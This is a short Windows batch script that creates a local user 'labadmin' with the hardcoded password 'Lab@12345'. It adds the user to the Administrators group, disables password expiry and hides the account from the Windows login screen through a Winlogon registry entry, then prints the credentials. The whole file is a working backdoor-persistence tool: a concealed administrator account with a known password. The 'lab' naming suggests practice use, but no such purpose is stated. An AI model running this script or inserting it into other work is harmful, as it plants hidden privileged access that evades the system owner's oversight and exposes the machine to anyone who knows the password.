@echo off
echo ================================
echo Creating hidden admin account...
echo ================================

:: Create user
net user labadmin Lab@12345 /add
IF %ERRORLEVEL% NEQ 0 (
    echo User already exists or error occurred
)

:: Add to Administrators group
net localgroup administrators labadmin /add

:: Prevent password expiry
wmic useraccount where name="labadmin" set PasswordExpires=FALSE

:: Hide account from login screen
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" ^
/v labadmin /t REG_DWORD /d 0 /f

echo.
echo ✔ Admin account created and hidden
echo ✔ Username: labadmin
echo ✔ Password: Lab@12345
echo.
pause
